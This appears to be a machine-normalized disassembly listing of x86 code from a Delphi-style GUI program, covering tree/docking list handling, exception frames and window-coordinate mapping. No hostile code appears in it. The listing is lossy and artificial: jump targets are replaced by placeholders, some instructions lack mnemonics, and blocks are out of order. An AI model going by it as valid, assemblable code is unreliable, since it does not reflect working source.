mov eax [ eax + 0xc ]
sub eax 0x2
push eax
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ ebp - 0x8 ]
add edx [ eax + 0x18 ]
inc edx
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
add ecx 0x5
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
add eax 0x3
call sub_437f64
pop ecx
push ebp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sub eax 0x2
push eax
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ ebp - 0x8 ]
add edx [ eax + 0x18 ]
inc edx
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
add ecx 0x8
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
add eax 0x6
call sub_437f64
pop ecx
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_43810c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f50c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43828f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_42b014
mov eax [ ebp - 0xc ]
call sub_40f8a4
xor eax eax
push ebp
push sub_438272
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40fcf0
xor eax eax
push ebp
push sub_438255
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_430844
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43825c
xor edx edx
mov eax [ ebp - 0xc ]
call sub_40fcf0
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x14 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x14 ]
call sub_4307d8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
call sub_42c198
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx ]
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x28 ]
sub edx [ eax + 0x30 ]
mov eax edx
add eax eax
sub [ ebp - 0x28 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x24 ]
sub edx [ eax + 0x34 ]
mov eax edx
add eax eax
sub [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x28 ]
sub eax edx
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0x1c ]
sub edx [ ebp - 0x24 ]
sub eax edx
add eax eax
sub [ ebp - 0x1c ] eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_43829c
push ebp
mov ebp esp
add esp 0xffffffd0
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43292c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_42c2b0
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_42c25c
mov ecx eax
xor edx edx
xor eax eax
call sub_43b7c8
mov eax [ ebp + 0x8 ]
lea esi [ ebp - 0x30 ]
mov edi eax
mov ecx 0x4
[ edi ] [ esi ]
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_434714
push eax
call MapWindowPoints
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp [ ebp - 0xc ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x3c ]
mov [ ebp - 0x1c ] eax
mov al [ ebp + 0xc ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x38 ]
sar eax 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x3c ]
sar eax 0x1
jns r-xdata
mov [ ebp - 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
add [ ebp - 0x14 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0x1c ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_43b800
mov eax [ ebp + 0x8 ]
lea esi [ ebp - 0x30 ]
mov edi eax
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp - 0x18 ]
add [ ebp - 0x10 ] eax
jmp r-xdata
sub_438444
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_438444
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44c070
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_438444
pop ecx
sub_438488
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_438444
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x8 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x64 ] edx
sub_43851c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_437120
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x38 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_438578
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8c ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x74 ]
sub_438578
push ebp
mov ebp esp
add esp 0xffffffdc
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4388f1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_44e378
lea eax [ ebp - 0x18 ]
push eax
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_44e378
mov edx [ ebp - 0x1c ]
pop eax
call sub_44cd68
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_436840
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x1
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_44e378
lea eax [ ebp - 0x20 ]
push eax
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_44e378
mov edx [ ebp - 0x24 ]
pop eax
call sub_44cd68
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
cmp [ ebp - 0x14 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_44c070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4388f8
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_44cb04
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
call sub_436cfc
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x20 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x18 ]
call sub_436cfc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
push eax
push sub_438f98
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4371a8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x68 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x68 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_44c070
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
call sub_438f60
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov [ eax + 0x10 ] 0x0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0xc ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_4368f0
mov edx [ ebp - 0xc ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0xc ]
call sub_436cfc
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x18 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_438f98
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4371a8
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_438f98
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4371a8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44c070
mov eax [ ebp - 0xc ]
call sub_44c070
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x18 ] edx
sub_4388fc
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43284c
test eax eax
jle r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x84 ]
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
lea esi [ ebp - 0x18 ]
lea edi [ eax + 0x20 ]
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov al [ eax + 0x10 ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x20 ]
lea eax [ ebp - 0x18 ]
mov ecx 0x10
call sub_4461ec
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x64 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43284c
test eax eax
jle r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x64 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_438d98
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_438f98
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4371a8
sub_438a10
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x48 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
fild [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
fmul [ eax + 0x40 ]
call sub_44bc28
mov edx [ ebp - 0x8 ]
mov [ edx + 0x20 ] eax
sub_438a54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44cf14
xor eax eax
push ebp
push sub_438abf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44cd60
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x8 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438ac6
lea eax [ ebp - 0x4 ]
call sub_44cae0
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_438acc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438b92
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_436bd4
mov eax [ ebp - 0xc ]
call sub_438a54
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_438acc
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438b99
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_438acc
pop ecx
sub_438ba0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_438cf9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_438ca8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_43284c
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov eax [ ebp - 0x10 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438caf
mov eax [ ebp - 0x18 ]
call sub_44c070
retn
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_438a54
pop ecx
inc [ ebp - 0xc ]
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
call sub_432880
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x47 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_438caf
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_438acc
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438d00
lea eax [ ebp - 0x20 ]
call sub_44cae0
retn
sub_438d08
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_438d08
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x14 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_438d08
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov eax [ eax + 0x14 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
jmp r-xdata
sub_438d98
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push ebp
mov eax [ ebp - 0x8 ]
call sub_438d08
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x74 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
sub_438dd0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_437120
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_438df4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
